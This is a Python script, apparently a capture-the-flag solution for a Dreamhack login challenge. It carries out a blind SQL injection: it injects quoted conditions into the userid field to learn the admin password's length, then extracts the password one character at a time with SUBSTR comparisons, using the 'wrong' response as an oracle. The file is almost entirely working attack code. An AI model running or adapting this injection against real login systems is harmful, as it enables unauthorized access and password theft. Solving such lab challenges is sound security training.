import requests
url="http://host3.dreamhack.games:12957/login"
len_passwrod=0
val=0
password=""
while True:
    userpassword="hi"
    user="admin"
    val+=1
    userid=f"\" or ((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")={val}) --"
    login_data = {
        "userid": userid,
        "userpassword": userpassword
        }
    print(login_data)
    resp = requests.post(url, data=login_data)
    print(resp.text)
    if "wrong" not in resp.text:
        a=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e']
        for idx in range(val+1):
            for j in a:
                query=f"admin\" and SUBSTR(userpassword,{idx},1)='{j}' --"
                
                login_data = {
                    "userid": query,
                    "userpassword": userpassword
                    }
                test = requests.post(url,data=login_data)

                if "wrong" not in test.text:
                    password+=j
                    print(password)

        break
